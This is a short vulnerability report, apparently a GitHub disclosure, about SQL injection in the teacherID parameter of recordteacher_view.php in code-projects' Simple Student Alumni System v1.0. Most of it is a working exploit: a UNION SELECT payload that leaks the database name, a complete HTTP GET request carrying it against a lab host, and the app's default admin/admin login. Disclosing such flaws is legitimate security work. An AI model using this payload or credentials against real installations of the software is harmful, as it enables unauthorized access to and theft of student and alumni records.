# Simple Student Alumni System v1.0 by code-projects has SQL injection 5

BUG_Author: Zhang Qi

Login account: admin/admin

vendors: https://code-projects.org/simple-student-alumni-system-in-php/

The program is built using the xmapp-php5.6 version

Vulnerability File: /TracerStudy/recordteacher_view.php?teacherID=

Vulnerability location: /TracerStudy/recordteacher_view.php?teacherID=, teacherID

dbname = tracerdata

[+] Payload: /TracerStudy/recordteacher_view.php?teacherID=1%27%20union%20select%201,2,3,4,5,database(),7,8,9,10,11,12,13,14,15,16--+ // Leak place ---> teacherID

```sql
GET /TracerStudy/recordteacher_view.php?teacherID=1%27%20union%20select%201,2,3,4,5,database(),7,8,9,10,11,12,13,14,15,16--+ HTTP/1.1
Host: 192.168.1.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=g17ug0qq4g9bcjtuvmurka4g55
Connection: close
```
<img width="1634" height="834" alt="image" src="https://github.com/user-attachments/assets/600a9277-0c01-4f0e-9d8d-d8de8ed1a7f7" />

